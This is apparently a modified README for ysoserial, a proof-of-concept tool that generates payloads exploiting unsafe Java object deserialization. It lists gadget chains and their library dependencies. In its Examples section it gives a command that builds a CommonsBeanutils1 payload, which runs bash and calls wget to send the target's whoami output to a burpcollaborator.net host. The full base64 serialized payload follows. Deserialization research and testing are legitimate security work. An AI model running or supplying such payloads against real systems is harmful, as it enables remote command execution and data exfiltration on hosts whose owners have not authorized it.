
# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples - Here it is different

```shell
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "java.lang.Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"exec wget http://$(echo '$(whoami)').3fje44rcgof3s85u7g5majjoifofc4.burpcollaborator.net\"}).waitFor();"|base64 

rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAB1XK/rq+AAAAMwBFCgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAEMBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAQamF2YS9sYW5nL1N0cmluZwcAMAEACS9iaW4vYmFzaAgAMgEAAi1jCAA0AQBOZXhlYyB3Z2V0IGh0dHA6Ly8kKHdob2FtaSkuM2ZqZTQ0cmNnb2Yzczg1dTdnNW1hampvaWZvZmM0LmJ1cnBjb2xsYWJvcmF0b3IubmV0CAA2AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADgAOQoAKwA6AQARamF2YS9sYW5nL1Byb2Nlc3MHADwBAAd3YWl0Rm9yAQADKClJDAA+AD8KAD0AQAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXIyMTcxNzUxNzc3NzU0MAEAH0x5c29zZXJpYWwvUHduZXIyMTcxNzUxNzc3NzU0MDsAIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAQAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMARAAAAAEAFQAWAAIAEAAAAD8AAAADAAAAAbEAAAACABEAAAAGAAEAAAA0ABIAAAAgAAMAAAABABMARAAAAAAAAQAXABgAAQAAAAEAGQAaAAIAGwAAAAQAAQAcAAEAFQAeAAIAEAAAAEkAAAAEAAAAAbEAAAACABEAAAAGAAEAAAA4ABIAAAAqAAQAAAABABMARAAAAAAAAQAXABgAAQAAAAEAHwAgAAIAAAABACEAIgADABsAAAAEAAEAHAAIACkABgABABAAAAA4AAYAAgAAACOnAAMBTLgALwa9ADFZAxIzU1kEEjVTWQUSN1O2ADu2AEFXsQAAAAEAQgAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEABwAmACgACXVxAH4AEAAAAdTK/rq+AAAAMwAbCgACAAMHAAQMAAUABgEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYHAAgBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcACgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAEAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAA8ABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAcAGAAaAAlwdAAEUHducnB3AQB4cQB+AA14
```

## Installation

1. Download the latest jar from
[JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

Note that GitHub-hosted releases were removed in compliance with the
[GitHub Community Guidelines](
    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
